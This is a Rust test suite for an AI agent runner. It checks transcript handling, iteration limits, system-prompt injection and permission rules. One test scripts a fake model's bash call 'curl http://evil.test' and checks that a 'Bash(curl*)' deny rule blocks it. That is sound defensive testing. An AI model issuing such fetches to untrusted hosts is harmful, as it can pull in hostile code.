use super::support::{
    AgentConfig, AgentError, AgentRunner, AgentSession, ApprovalOutcome, Arc, AssistantContent,
    FakeModel, IdentitySection, Message, PermissionPolicy, RuleOrigin, ScriptedApprover,
    SystemPrompt, ToolRegistry, bash, parse_rule, response, tool_result_text,
};

#[tokio::test]
async fn run_turn_updates_transcript_in_place() {
    let model = FakeModel::new([response(AssistantContent::text("done"))]);
    let runner = AgentRunner::new(model, ToolRegistry::new());
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "finish this")
        .await
        .expect("agent turn should complete");

    assert_eq!(turn.final_text(&session), "done");
    assert_eq!(turn.final_message_index, 1);
    assert_eq!(session.messages().len(), 2);
}

#[tokio::test]
async fn requests_keep_stable_prefix_between_tool_iterations() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf cache" }),
        )),
        response(AssistantContent::text("done")),
    ]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    let runner = AgentRunner::with_config(model.clone(), registry, AgentConfig::default())
        .with_system_prompt(SystemPrompt::new(vec![Box::new(IdentitySection::new(
            "be stable",
        ))]));
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "inspect the workspace")
        .await
        .expect("agent run should complete");

    let requests = model.requests();
    assert_eq!(requests.len(), 2);
    assert_eq!(requests[0].tools, requests[1].tools);
    assert!(
        requests[1]
            .chat_history
            .starts_with(&requests[0].chat_history)
    );
    assert_eq!(requests[0].chat_history.len(), 2);
    assert_eq!(requests[1].chat_history.len(), 4);
}

#[tokio::test]
async fn stops_when_max_iterations_is_exhausted() {
    let model = FakeModel::new([response(AssistantContent::tool_call(
        "call_1",
        "bash",
        serde_json::json!({ "cmd": "printf loop" }),
    ))]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    let runner = AgentRunner::with_config(
        model,
        registry,
        AgentConfig {
            max_iterations: 1,
            ..AgentConfig::default()
        },
    );
    let mut session = AgentSession::new();

    let err = runner
        .run_turn(&mut session, "keep using tools")
        .await
        .expect_err("run should stop at the iteration budget");

    let AgentError::MaxIterations {
        max_iterations,
        messages,
        usage,
    } = err
    else {
        panic!("expected MaxIterations, got {err:?}");
    };

    assert_eq!(max_iterations, 1);
    // The partial transcript is preserved: user prompt, assistant tool
    // call, and the tool result appended before the budget was hit.
    assert_eq!(messages.len(), 3);
    assert_eq!(usage.total_tokens, 3);
}

#[tokio::test]
async fn injects_system_prompt_as_first_message() {
    let model = FakeModel::new([response(AssistantContent::text("hi"))]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    // Only an identity section, so the assembled prompt is exactly the text
    // asserted below (no tools/plan blocks appended).
    let runner = AgentRunner::with_config(model.clone(), registry, AgentConfig::default())
        .with_system_prompt(SystemPrompt::new(vec![Box::new(IdentitySection::new(
            "be terse",
        ))]));
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "hello")
        .await
        .expect("run completes");

    // The system prompt is request-only, never part of the transcript.
    assert!(!matches!(
        session.messages().first(),
        Some(Message::System { .. })
    ));

    let request = &model.requests()[0];
    let Message::System { content } = request.chat_history.first() else {
        panic!("system prompt should be the first message sent to the model");
    };
    assert_eq!(content, "be terse");
}

#[tokio::test]
async fn rejects_empty_transcript() {
    let runner = AgentRunner::new(FakeModel::default(), ToolRegistry::new());
    let mut session = AgentSession::new();

    let err = runner
        .continue_session(&mut session)
        .await
        .expect_err("empty transcript is invalid");

    assert!(matches!(err, AgentError::EmptyTranscript));
}

#[tokio::test]
async fn deny_rule_blocks_tool_with_permission_denied() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "curl http://evil.test" }),
        )),
        response(AssistantContent::text("understood")),
    ]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    let mut policy = PermissionPolicy::new();
    policy
        .deny
        .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
    let runner = AgentRunner::new(model, registry).with_policy(policy);
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "fetch the script")
        .await
        .expect("a denial is model-recoverable, so the turn still completes");

    // The tool never ran; the model got a clear permission_denied result.
    let result = tool_result_text(&session, 2);
    assert!(result.contains("permission_denied"), "got {result}");
    assert!(result.contains("Bash(curl*)"), "got {result}");
}

#[tokio::test]
async fn allow_always_grant_skips_the_second_prompt() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf one" }),
        )),
        response(AssistantContent::tool_call(
            "call_2",
            "bash",
            serde_json::json!({ "cmd": "printf two" }),
        )),
        response(AssistantContent::text("done")),
    ]);
    let mut registry = ToolRegistry::new();
    registry.register(bash().await);
    let grant = parse_rule("Bash(printf*)", RuleOrigin::SessionGrant).unwrap()[0].clone();
    // Exactly ONE scripted outcome: if the second call also prompted, the
    // scripted approver would panic ("ran out of outcomes"). A clean pass
    // proves the session grant short-circuited the gate.
    let runner =
        AgentRunner::new(model, registry).with_approver(Arc::new(ScriptedApprover::new([
            ApprovalOutcome::AllowAlways(grant),
        ])));
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "print twice")
        .await
        .expect("both calls run, the second via the grant");

    assert_eq!(turn.final_text(&session), "done");
    assert!(tool_result_text(&session, 2).contains("\"stdout\":\"one\""));
    assert!(tool_result_text(&session, 4).contains("\"stdout\":\"two\""));
    // The grant is recorded on the session for later turns too.
    assert_eq!(session.permissions().allow_grants().len(), 1);
}
